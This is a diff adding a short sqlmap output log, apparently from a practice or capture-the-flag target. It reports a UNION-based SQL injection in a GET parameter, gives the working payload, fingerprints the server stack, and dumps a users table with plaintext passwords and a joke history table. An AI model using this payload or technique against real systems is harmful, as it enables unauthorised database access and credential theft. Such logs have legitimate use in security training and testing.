@@ -1,0 +1,34 @@
+sqlmap identified the following injection points with a total of 176 HTTP(s) requests:
+---
+Place: GET
+Parameter: a
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: a=b' UNION ALL SELECT ':ofv:'||'JXfFTLCJxh'||':ivl:',NULL-- 
+---
+web server operating system: Linux Debian 6.0 (squeeze)
+web application technology: PHP 5.3.3, Apache 2.2.16
+back-end DBMS: SQLite
+Database: SQLite_masterdb
+Table: users
+[2 entries]
++----+---------+----------+
+| id | name    | password |
++----+---------+----------+
+| 1  | toto    | tamere   |
+| 2  | florian | samere   |
++----+---------+----------+
+
+Database: SQLite_masterdb
+Table: history
+[5 entries]
++----+-------------------------+
+| id | log                     |
++----+-------------------------+
+| 1  | Nothing here            |
+| 2  | I said nothing here     |
+| 3  | Don't you understand    |
+| 4  | DA FUK                  |
+| 5  | WHY U NO INDENNNNNTTTTT |
++----+-------------------------+
+
